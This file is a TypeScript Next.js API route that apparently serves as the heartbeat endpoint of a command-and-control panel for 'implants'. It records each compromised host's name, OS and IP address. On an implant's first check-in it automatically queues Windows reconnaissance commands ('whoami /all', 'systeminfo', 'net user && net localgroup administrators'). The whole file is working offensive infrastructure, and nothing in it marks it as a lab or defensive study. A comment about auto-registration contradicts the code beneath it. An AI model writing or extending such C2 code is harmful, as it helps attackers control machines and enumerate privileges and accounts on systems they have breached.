import { NextResponse, type NextRequest } from "next/server"
import { z } from "zod"
import { getImplantByImplantId, updateImplantLastSeen, listImplantTasks, createImplantTask } from "@/lib/db/implants"
import logger from "@/lib/logger"

const log = logger.child({ module: "api/dpanel/implant/heartbeat" })

export const runtime = "nodejs"
export const dynamic = "force-dynamic"

const HeartbeatSchema = z.object({
  implant_id: z.string(),
  timestamp: z.number(),
  status: z.string().default("active"),
  system_info: z.object({
    hostname: z.string().optional(),
    os: z.string().optional(),
    arch: z.string().optional(),
    uptime: z.number().optional(),
    memory_mb: z.number().optional(),
    go_version: z.string().optional(),
  }).optional(),
  network_state: z.object({
    interface: z.string().optional(),
    ip_address: z.string().optional(),
    latency_ms: z.number().optional(),
  }).optional(),
  beacon_state: z.object({
    consecutive_failures: z.number().optional(),
    current_backoff: z.number().optional(),
    total_checkins: z.number().optional(),
  }).optional(),
})

export async function POST(req: NextRequest): Promise<NextResponse> {
  try {
    const body = await req.json()
    const hb = HeartbeatSchema.parse(body)

    const implant = await getImplantByImplantId(hb.implant_id)
    if (!implant) {
      // Auto-register on first heartbeat from unknown implant
      log.info({ implant_id: hb.implant_id }, "Heartbeat from unregistered implant — ignored")
      return NextResponse.json({ ok: true, registered: false })
    }

    await updateImplantLastSeen(hb.implant_id)

    log.info({
      implant_id: hb.implant_id,
      hostname: hb.system_info?.hostname,
      os: hb.system_info?.os,
      ip: hb.network_state?.ip_address,
      failures: hb.beacon_state?.consecutive_failures,
    }, "Heartbeat received")

    // First-beacon auto-tasking: assign initial recon tasks on first check-in
    if (hb.beacon_state?.total_checkins === 1) {
      const existingTasks = await listImplantTasks(hb.implant_id)
      if (existingTasks.length === 0) {
        const firstBeaconTasks = [
          { type: "discovery", args: { command: "whoami /all", description: "User and privilege enumeration" } },
          { type: "discovery", args: { command: "systeminfo", description: "System information gathering" } },
          { type: "discovery", args: { command: "net user && net localgroup administrators", description: "Local accounts enumeration" } },
        ]
        for (const t of firstBeaconTasks) {
          await createImplantTask({
            implantId: hb.implant_id,
            taskId: `auto-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
            type: t.type,
            args: t.args,
          }).catch(() => {})
        }
        log.info({ implant_id: hb.implant_id }, "First beacon — auto-recon tasks assigned")
      }
    }

    return NextResponse.json({
      ok: true,
      registered: true,
      server_time: Date.now(),
    })
  } catch (error) {
    log.error({ err: error }, "Heartbeat error")
    return NextResponse.json({ error: "Invalid request" }, { status: 400 })
  }
}
